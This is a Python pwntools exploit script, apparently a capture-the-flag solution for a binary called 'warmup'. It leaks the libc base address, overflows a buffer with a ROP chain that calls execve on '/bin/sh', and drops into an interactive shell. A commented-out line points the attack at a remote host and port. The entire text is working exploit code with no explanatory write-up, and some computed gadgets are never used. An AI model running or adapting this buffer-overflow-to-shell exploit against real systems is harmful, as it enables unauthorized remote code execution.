from pwn import *


context.gdbinit = "/opt/pwndbg/gdbinit"
context.terminal = "kitty"
gdbscript = '''
    break *main+161
'''

if (args.GDB):
    pp = gdb.debug("./warmup", gdbscript=gdbscript)
else:
    pp = process("./warmup")
    # pp = remote("172.210.180.5", 1338)
elf = context.binary = ELF("./warmup")
libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)

libc.address = int(pp.recvline().rstrip(), 16) - libc.sym.puts
log.info(f"libc base {hex(libc.address)}")
pp.recvuntil(b">> ")

syscall = libcrops.find_gadget(['syscall', 'ret']).address
pop_rsi = libcrops.rsi.address + libc.address
pop_rdx = libcrops.rdx.address + libc.address

pay = flat(
            cyclic(200),
            libcrops.rdi.address + libc.address, 
            next(libc.search(b"/bin/sh")),
            pop_rsi,
            0,
            libc.sym.execve,
        )

pp.sendline(pay)

gadget = 0x000000000040118e
pp.recvuntil(b">> ")
pp.sendline(cyclic(64) + p64(0x00404040 + 1000)  + p64(gadget) + p64(0x404060 + 200))


pp.interactive()
